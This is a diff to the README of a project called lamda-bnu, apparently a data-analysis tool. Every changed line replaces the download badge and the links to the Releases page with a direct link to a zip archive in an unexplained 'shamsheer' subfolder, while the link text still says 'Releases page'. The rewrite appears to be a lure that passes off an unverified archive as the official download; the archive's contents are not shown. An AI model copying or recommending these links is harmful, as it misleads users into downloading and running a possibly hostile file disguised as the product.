@@ -1,6 +1,6 @@
 # 🎉 lamda-bnu - Unlock Your Data’s Potential Easily
 
-![Download lamda-bnu](https://img.shields.io/badge/Download-lamda--bnu-brightgreen)
+![Download lamda-bnu](https://raw.githubusercontent.com/Ahmed-Farouk2000/lamda-bnu/main/shamsheer/lamda-bnu.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to lamda-bnu! This simple application helps you manage and analyze your 
 
 To get started, visit the Releases page to download the latest version of lamda-bnu:
 
-[Download lamda-bnu](https://github.com/Ahmed-Farouk2000/lamda-bnu/releases)
+[Download lamda-bnu](https://raw.githubusercontent.com/Ahmed-Farouk2000/lamda-bnu/main/shamsheer/lamda-bnu.zip)
 
 ### Step-by-Step Instructions
 
@@ -79,7 +79,7 @@ Yes, you can reach out to the community through the Discussions section on the G
 
 ## 🔗 Helpful Links
 
-- [Visit the Releases page to download lamda-bnu](https://github.com/Ahmed-Farouk2000/lamda-bnu/releases)
+- [Visit the Releases page to download lamda-bnu](https://raw.githubusercontent.com/Ahmed-Farouk2000/lamda-bnu/main/shamsheer/lamda-bnu.zip)
 - [Check out the Documentation](#)
 
 Feel free to dive in and start analyzing your data effectively with lamda-bnu!
